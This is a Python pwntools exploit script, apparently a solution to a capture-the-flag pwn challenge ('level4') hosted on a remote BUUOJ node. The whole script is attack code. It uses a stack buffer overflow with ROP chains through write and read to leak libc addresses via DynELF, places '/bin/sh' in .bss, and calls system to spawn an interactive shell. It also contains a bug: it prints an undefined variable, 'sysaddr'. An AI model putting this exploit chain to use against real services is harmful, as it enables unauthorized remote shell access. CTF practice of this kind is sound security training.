#!/usr/bin/env python
from pwn import *
io=remote("node4.buuoj.cn",27076)
elf=ELF("./level4")
vulner_function_address=0x804844B
write_plt=elf.plt["write"]
read_plt=elf.plt["read"]
bss_addr=0x0804a024
def leak(address):
    payload="a"*0x88+"aaaa"+p32(write_plt)+p32(vulner_function_address)+p32(1)+p32(address)+p32(4)
    io.sendline(payload)
    leak_sysaddr=io.recv(4)
    print "%#x => %s" % (address, (leak_sysaddr or '').encode('hex'))   #调试用可省略（最好是省略）
    return leak_sysaddr
d = DynELF(leak, elf=ELF("./level4"))
sys_addr=d.lookup("system","libc")
print hex(sysaddr)
payload1="a"*0x88+"aaaa"+p32(read_plt)+p32(vulner_function_address)+p32(1)+p32(bss_addr)+p32(8)
io.sendline(payload1)
io.sendline("/bin/sh")
payload2="a"*0x88+"aaaa"+p32(sys_addr)+p32(vulner_function_address)+p32(bss_addr)
io.sendline(payload2)
io.interactive()
